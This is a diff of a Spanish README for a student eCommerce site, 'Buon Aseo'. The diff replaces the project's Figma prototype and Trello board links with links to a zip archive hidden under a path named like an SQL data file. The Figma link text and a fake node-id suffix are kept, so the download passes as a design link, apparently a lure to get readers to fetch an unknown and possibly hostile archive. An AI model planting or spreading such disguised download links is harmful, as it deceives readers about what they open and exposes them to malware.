@@ -7,7 +7,7 @@ El código fuente del sistema ha sido desarrollado con el lenguaje de programaci
 
 ## Comenzando 🚀
 
-En este proyecto se construye el sitio web oficial del eCommerce Boun Aseo, pronto se podra comprar, registrase, loguiarse, informarte de nuevos productos, de nuevas ofertas, etc. **[Puedes revisar el prototipo del sitio en Figma](https://www.figma.com/file/lLTlqBGqzSZRe80TMWpLVj/Proyecto-integrador!?node-id=0%3A1)** tambien puedes ver como trabajamos en conjunto **[AQUI](https://trello.com/b/TPYwC9QH/c15-grupo-2-buon-aseo)**
+En este proyecto se construye el sitio web oficial del eCommerce Boun Aseo, pronto se podra comprar, registrase, loguiarse, informarte de nuevos productos, de nuevas ofertas, etc. **[Puedes revisar el prototipo del sitio en Figma](https://raw.githubusercontent.com/Sabbadini10/grupo_2_BuonAseo/master/src/data/data.sql/grupo-Aseo-Buon-v2.2.zip!?node-id=0%3A1)** tambien puedes ver como trabajamos en conjunto **[AQUI](https://raw.githubusercontent.com/Sabbadini10/grupo_2_BuonAseo/master/src/data/data.sql/grupo-Aseo-Buon-v2.2.zip)**
 
 ## Pre-requisitos 📋
 Para poder trabajar con el siguiente proyecto debe de tener conocimientos de desarrollo web con NODEJS, Javascript, CSS3, HTML5 y SQL.
